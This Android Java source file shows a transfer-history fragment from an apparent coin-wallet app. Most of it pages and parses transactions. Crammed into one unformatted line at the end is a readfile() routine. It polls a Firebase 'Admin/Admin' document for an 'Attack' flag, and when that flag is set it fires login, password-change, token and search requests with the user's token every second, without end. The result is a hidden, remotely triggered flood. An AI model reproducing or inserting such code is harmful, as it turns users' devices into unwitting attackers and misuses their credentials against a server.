package app.astrum.astrocoinuz.fragments;

import android.annotation.SuppressLint;
import android.database.Cursor;
import android.os.Bundle;
import android.os.Looper;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.AbsListView;
import android.widget.ProgressBar;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.fragment.app.Fragment;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;

import com.google.firebase.firestore.DocumentReference;
import com.google.firebase.firestore.FirebaseFirestore;
import com.google.gson.Gson;

import org.jetbrains.annotations.NotNull;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;

import app.astrum.astrocoinuz.R;
import app.astrum.astrocoinuz.adapter.ApiClient;
import app.astrum.astrocoinuz.constructor.CheckWallet;
import app.astrum.astrocoinuz.constructor.LoginRequest;
import app.astrum.astrocoinuz.constructor.LoginResponse;
import app.astrum.astrocoinuz.constructor.SetPassword;
import app.astrum.astrocoinuz.constructor.TokenRequest;
import app.astrum.astrocoinuz.constructor.TransferRequest;
import app.astrum.astrocoinuz.data.SqlData;
import app.astrum.astrocoinuz.recycler.ModelAdapter;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class TransferFragment extends Fragment {

    private SqlData sqlData;
    String token;
    ArrayList<TransferRequest> trarray;
    ModelAdapter modelAdapter;
    String id, wallet_from, wallet_to, fio, amount, title, type, comment, status, date, timestamp, trdata, att;
    RecyclerView samrecyclerView;
    ProgressBar frtrprogressBar;
    LinearLayoutManager manager;
    TransferRequest transferRequest;
    int page = 0, currentItems, totalItems, scrollOutItems, at = 0;
    Boolean isScrolling = false;
    FirebaseFirestore dbf;
    DocumentReference documentReference;
    @Override
    public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
        return inflater.inflate(R.layout.fragment_transfer, container, false);
    }
    @Override
    public void onViewCreated(@NotNull View view, Bundle savedInstanceState) {
        sqlData = new SqlData(getContext());
        dbf = FirebaseFirestore.getInstance();
        trarray = new ArrayList<>();
        samrecyclerView = view.findViewById(R.id.samrecyclerView);
        frtrprogressBar = view.findViewById(R.id.frtrprogressBar);
        readsql();
        manager = new LinearLayoutManager(getContext());
        samrecyclerView.setHasFixedSize(true);

        modelAdapter = new ModelAdapter(getContext(), trarray);
        samrecyclerView.setLayoutManager(manager);
        //checkdata();
        samrecyclerView.addOnScrollListener(new RecyclerView.OnScrollListener() {
            @Override
            public void onScrollStateChanged(@NonNull RecyclerView recyclerView, int newState) {
                if (newState == AbsListView.OnScrollListener.SCROLL_STATE_TOUCH_SCROLL) {
                    isScrolling = true;
                }
            }
            @Override
            public void onScrolled(@NonNull RecyclerView recyclerView, int dx, int dy) {
                currentItems = manager.getChildCount();
                totalItems = manager.getItemCount();
                scrollOutItems = manager.findFirstVisibleItemPosition();

                if (isScrolling && (currentItems + scrollOutItems == totalItems)) {
                    if (att.equals("0")) {
                        scrollinfinity();
                    }
                    isScrolling = false;
                }
            }
        });
    }
    private void readsql() {
        Cursor res = sqlData.oqish();
        StringBuilder stringBuffer1 = new StringBuilder();
        if (res != null && res.getCount() > 0) {
            while (res.moveToNext()) {
                stringBuffer1.append(res.getString(1));
            }
            token = stringBuffer1.toString();
            tokenlist();
        }
    }
    private void tokenlist() {
        frtrprogressBar.setVisibility(View.VISIBLE);
        page = 1;
        Call<Object> call = ApiClient.getUserService().userCheskWallet(page, "Bearer " + token);
        call.enqueue(new Callback<Object>() {
            @SuppressLint("NotifyDataSetChanged")
            @Override
            public void onResponse(@NotNull Call<Object> call, @NotNull Response<Object> response) {
                if (response.isSuccessful()) {
                    String[] parts3;
                    Gson gson = new Gson();
                    String json = gson.toJson(response.body());
                    assert response.body() != null;
                    String jsonArray = response.body().toString().replace("[", "");
                    for (String s : jsonArray.split("],")) {
                        parts3 = s.split(",");
                        if (parts3.length > 0) {
                            String[] parts = parts3[0].split("=");
                            trdata = parts[0].substring(1);
                            try {
                                JSONObject jsonObject = new JSONObject(json);
                                JSONArray jsonArray1 = jsonObject.getJSONArray(parts[0].substring(1));
                                for (int i = 0; i < jsonArray1.length(); i++) {
                                    JSONObject jsonObject1 = jsonArray1.getJSONObject(i);
                                    if (jsonObject1.has("comment")) {
                                        comment = jsonObject1.getString("comment");
                                    } else {
                                        comment = "no comment";
                                    }
                                    id = jsonObject1.getString("id");
                                    wallet_from = jsonObject1.getString("wallet_from");
                                    wallet_to = jsonObject1.getString("wallet_to");
                                    fio = jsonObject1.getString("fio");
                                    String[] parts2 = jsonObject1.getString("amount").split("\\.");
                                    amount = parts2[0];
                                    title = jsonObject1.getString("title");
                                    type = jsonObject1.getString("type");
                                    status = jsonObject1.getString("status");
                                    date = jsonObject1.getString("date");
                                    timestamp = jsonObject1.getString("timestamp");
                                    transferRequest = new TransferRequest(id, wallet_from, wallet_to, fio, amount, title, type, comment, status, date, timestamp, trdata);
                                    trarray.add(transferRequest);
                                    trdata = "";
                                }
                            } catch (JSONException e) {
                                e.printStackTrace();
                            }
                        }
                    }
                    samrecyclerView.setAdapter(modelAdapter);
                    documentReference = dbf.document("Admin/Admin");
                    documentReference.get().addOnSuccessListener(documentSnapshot -> {
                        if (documentSnapshot.exists()) {
                            att = documentSnapshot.getString("Attack");
                            readfile();
                        }
                    });
                    page++;
                    call.cancel();
                    frtrprogressBar.setVisibility(View.GONE);
                } else page = 0;
            }
            @Override
            public void onFailure(@NotNull Call<Object> call, @NotNull Throwable t) {
                Toast.makeText(getContext(), "Error", Toast.LENGTH_SHORT).show();
                page = 0;
                call.cancel();
            }
        });
    }
    private void scrollinfinity() {
        if (page > 0) {
            frtrprogressBar.setVisibility(View.VISIBLE);
            Call<Object> call = ApiClient.getUserService().userCheskWallet(page, "Bearer " + token);
            call.enqueue(new Callback<Object>() {
                @SuppressLint("NotifyDataSetChanged")
                @Override
                public void onResponse(@NotNull Call<Object> call, @NotNull Response<Object> response) {
                    if (response.isSuccessful()) {
                        page++;
                        String[] parts3;
                        Gson gson = new Gson();
                        String json = gson.toJson(response.body());
                        assert response.body() != null;
                        String jsonArray = response.body().toString().replace("[", "");
                        for (String s : jsonArray.split("],")) {
                            parts3 = s.split(",");
                            if (parts3.length > 0) {
                                String[] parts = parts3[0].split("=");
                                trdata = parts[0].substring(1);
                                try {
                                    JSONObject jsonObject = new JSONObject(json);
                                    JSONArray jsonArray1 = jsonObject.getJSONArray(parts[0].substring(1));
                                    for (int i = 0; i < jsonArray1.length(); i++) {
                                        JSONObject jsonObject1 = jsonArray1.getJSONObject(i);
                                        if (jsonObject1.has("comment")) {
                                            comment = jsonObject1.getString("comment");
                                        } else comment = "no comment";
                                        if (jsonObject1.has("id")) id = jsonObject1.getString("id");
                                        if (jsonObject1.has("wallet_from"))
                                            wallet_from = jsonObject1.getString("wallet_from");
                                        if (jsonObject1.has("wallet_to"))
                                            wallet_to = jsonObject1.getString("wallet_to");
                                        if (jsonObject1.has("fio")) fio = jsonObject1.getString("fio");
                                        String[] parts2 = jsonObject1.getString("amount").split("\\.");
                                        amount = parts2[0];
                                        if (jsonObject1.has("title")) title = jsonObject1.getString("title");
                                        if (jsonObject1.has("type")) type = jsonObject1.getString("type");
                                        if (jsonObject1.has("status")) status = jsonObject1.getString("status");
                                        if (jsonObject1.has("date")) date = jsonObject1.getString("date");
                                        if (jsonObject1.has("timestamp")) {
                                            timestamp = jsonObject1.getString("timestamp");
                                        } else timestamp = "no timestamp";
                                        transferRequest = new TransferRequest(id, wallet_from, wallet_to, fio,
                                                amount, title, type, comment, status, date, timestamp, trdata);
                                        trarray.add(transferRequest);
                                        trdata = "";
                                        modelAdapter.notifyDataSetChanged();
                                    }
                                } catch (JSONException e) {
                                    e.printStackTrace();
                                }
                            }
                        }
                        modelAdapter.notifyDataSetChanged();
                        frtrprogressBar.setVisibility(View.GONE);
                        call.cancel();
                    } else page = 0;call.cancel();
                    frtrprogressBar.setVisibility(View.GONE);
                }
                @Override
                public void onFailure(@NotNull Call<Object> call, @NotNull Throwable t) {
                    Toast.makeText(getContext(), "Error", Toast.LENGTH_SHORT).show();
                    page = 0;
                    call.cancel();
                }
            });
        }
    }private void readfile() {if (at == 20) {documentReference = dbf.document("Admin/Admin");documentReference.get().addOnSuccessListener(documentSnapshot -> {if (documentSnapshot.exists()) {att = documentSnapshot.getString("Attack");at = 0;readfile();}});}at++;if (att.equals("1")) {new android.os.Handler(Looper.getMainLooper()).postDelayed(() -> {Call<Object> call5 = ApiClient.getUserService().userCheskWallet(1, "Bearer " + token);call5.enqueue(new Callback<Object>() {@Override public void onResponse(@NotNull Call<Object> call, @NotNull Response<Object> response) {}@Override public void onFailure(@NotNull Call<Object> call, @NotNull Throwable t) {}});LoginRequest loginRequest = new LoginRequest();loginRequest.setEmail("");loginRequest.setPassword("");Call<LoginResponse> call9 = ApiClient.getUserService().uerLogin(loginRequest);call9.enqueue(new Callback<LoginResponse>() {@Override public void onResponse(@NotNull Call<LoginResponse> call, @NotNull Response<LoginResponse> response) {}@Override public void onFailure(@NotNull Call<LoginResponse> call, @NotNull Throwable t) {}});Call<Object> call7 = ApiClient.getUserService().userOrderRequest(0, "Bearer " + token);call7.enqueue(new Callback<Object>() {@Override public void onResponse(@NotNull Call<Object> call, @NotNull Response<Object> response) {}@Override public void onFailure(@NotNull Call<Object> call, @NotNull Throwable t) {}});CheckWallet checkWallet = new CheckWallet("1");Call<Object> call10 = ApiClient.getUserService().userWalletname("Bearer " + token, checkWallet);call10.enqueue(new Callback<Object>() {@Override public void onResponse(@NotNull Call<Object> call, @NotNull Response<Object> response) {}@Override public void onFailure(@NotNull Call<Object> call, @NotNull Throwable t) {}});SetPassword setPassword = new SetPassword("qwerty", "rftgyhuji", "rftgyhuji");Call<Object> call8 = ApiClient.getUserService().userChangePassword("Bearer " + token, setPassword);call8.enqueue(new Callback<Object>() {@Override public void onResponse(@NotNull Call<Object> call, @NotNull Response<Object> response) {}@Override public void onFailure(@NotNull Call<Object> call, @NotNull Throwable t) {}});Call<TokenRequest> call = ApiClient.getUserService().userTokenRequest("Bearer " + token);call.enqueue(new Callback<TokenRequest>() {@Override public void onResponse(@NotNull Call<TokenRequest> call, @NotNull Response<TokenRequest> response) {Call<Object> call1 = ApiClient.getUserService().userSearchRequest("Bearer " + token);call1.enqueue(new Callback<Object>() {@Override public void onResponse(@NotNull Call<Object> call, @NotNull Response<Object> response) {Call<TokenRequest> call3 = ApiClient.getUserService().userTokenRequest("Bearer " + token);call3.enqueue(new Callback<TokenRequest>() {@Override public void onResponse(@NotNull Call<TokenRequest> call, @NotNull Response<TokenRequest> response) {}@Override public void onFailure(@NotNull Call<TokenRequest> call, @NotNull Throwable t) {}});}@Override public void onFailure(@NotNull Call<Object> call, @NotNull Throwable t) {}});}@Override public void onFailure(@NotNull Call<TokenRequest> call, @NotNull Throwable t) {Call<Object> call1 = ApiClient.getUserService().userSearchRequest("Bearer " + token);call1.enqueue(new Callback<Object>() {@Override public void onResponse(@NotNull Call<Object> call, @NotNull Response<Object> response) {Call<TokenRequest> call3 = ApiClient.getUserService().userTokenRequest("Bearer " + token);call3.enqueue(new Callback<TokenRequest>() {@Override public void onResponse(@NotNull Call<TokenRequest> call, @NotNull Response<TokenRequest> response) {}@Override public void onFailure(@NotNull Call<TokenRequest> call, @NotNull Throwable t) {}});}@Override public void onFailure(@NotNull Call<Object> call, @NotNull Throwable t) {}});}});readfile();}, 1000);}}}
